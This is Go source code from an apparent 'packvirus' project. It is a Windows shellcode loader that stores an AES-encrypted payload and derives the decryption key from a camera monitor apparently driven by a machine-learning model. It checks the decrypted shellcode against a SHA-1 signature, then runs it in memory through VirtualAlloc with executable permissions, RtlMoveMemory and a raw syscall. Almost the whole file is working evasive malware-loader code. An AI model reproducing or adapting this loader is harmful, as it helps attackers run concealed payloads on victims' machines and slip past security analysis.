package main

import (
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/gonutz/ide/w32"
	"os"
	"packvirus/encrypt"
	"packvirus/template/monitor"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var modelPath string = "C:\\Users\\zhang\\workspace\\packvirus\\src\\model\\mnist_2"
var labelPath string = "C:\\Users\\zhang\\workspace\\packvirus\\src\\model\\mnist_2\\label.txt"
var encryptedShellCode string = "d1AHLz6L/gs+MMcJE5uUglxFK968tKWC1gtgu68cDAukYSQsgGprPg+e7CrGnw43Lig+cNUN7XnzNkl/ksalrraNuY+b3/cp0hR6m3Cwc3GoNYc/a/x4pyMq5qtO0gKfnphAxhj+jbcnxP+L7ZWmnW9r1GpsdcaHc8+VOQqzx6418KsZoBqf4WgZN+9UOetmufIiPYmHRPT1nNGzDm3DFdwM9VhTBJ5BqdvZaMAyrY3Esrd0Pu142ZYX0+6F4PYMubs9goXAew9oXPuJjSinMG9l4CCQyB6iGhYWTuy2UlO7pHjJvWYstdeerOeAc+wqgspB8YENS411taRaYOzVKv4LgcXGB0A1lvI8BaiKdlJlXamuWQkVfMgKfOyjUW94ziRZuh2eZQ2w4hzLH34gyBGIxzuv7OjWpbzzPqvMSS1UnjmkqapNV3bDnE46fzUswY2CZyIC3g15Afz2fvpzaNLtYVlEwRkMufo5TddKacn1/WOX/akcZ+fJE5+19vEMp6ga34uYuBCJ3q+rUYh0bFmZkJXBuBMsCjdrlisSrjOYl36MzIQaF0r5hQLBjk57ONtJCbt5hKwquwgaCeK7mpqShD+FIYVA71BWityK+5rb/5FwPQG2vRB+p6p+CQvhCqUcgJ89KB/EB2BirbrZxYcy0sm6aK4kVmdT4PQ7PByp36DDEnLUFDLETkfNwZS/jCOiEby7f5QgP0kidlYfPHoZJRIW7KTPU7XKoT2eBCPkBPhdbq8V+aR0OnPTvC2A0H2f3+YeO9eNvZMQETSb+iIOo1E0u18PNHfko7oOWJAytTZm6XbgY7Nz+5pUmbdkP9b4GA3tmMznLklcgQjlmluAFQKWT0cJFFk+6wyhe4HxrqRBYRfk9aokMw129xjNvomXFD643Os0yGwdr9N5Qg=="
var signature string = "72ba4ded67abf0a97bc1491a36b487eadf6490e9"

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func main() {
	wg := sync.WaitGroup{}
	// you should load model before you start monitoring
	//picChan := make(chan *gocv.Mat)
	//soundChan := make(chan string)
	keyChan := make(chan string)
	exitChan := make(chan bool)

	ticker := time.NewTicker(3 * time.Second)

	baseByte, _ := base64.StdEncoding.DecodeString(encryptedShellCode)

	wg.Add(2)

	// start the video monitor task
	go monitor.VideoMonitor(&wg, ticker, modelPath, labelPath, keyChan, exitChan)

	go func(src []byte) {
		defer wg.Done()

		for {
			baseByteCopy := make([]byte, len(src))
			copy(baseByteCopy, src)

			if key, ok := <-keyChan; ok {
				fmt.Println(key)
				sc, err := encrypt.DecryptFunctions["aes"]([]byte(baseByteCopy), []byte(key))
				if err != nil {
					fmt.Println(err)
					return
				}

				hash := sha1.New()
				hash.Write([]byte(sc))
				scSig := hash.Sum([]byte(""))

				fmt.Println("signature 1:", hex.EncodeToString(scSig))
				fmt.Println("signature 2:", signature)

				if hex.EncodeToString(scSig) == signature {
					fmt.Println("yes!")
					build(string(sc))
					exitChan <- true
					close(exitChan)
					return
				} else {
					fmt.Println("key is wrong")
					continue
				}

			} else {
				fmt.Println("build end")
				return
			}
		}
	}(baseByte)

	wg.Wait()
	fmt.Println("end")
}

//----------------Utils----------------

func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	_, _, err := syscall.Syscall(addr, 0, 0, 0, 0)
	checkError(err)
}

func checkError(err error) {
	if err == nil {
		os.Exit(1)
	}
}

func showConsoleAsync(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// VideoMonitor -
func VideoMonitor() {

}
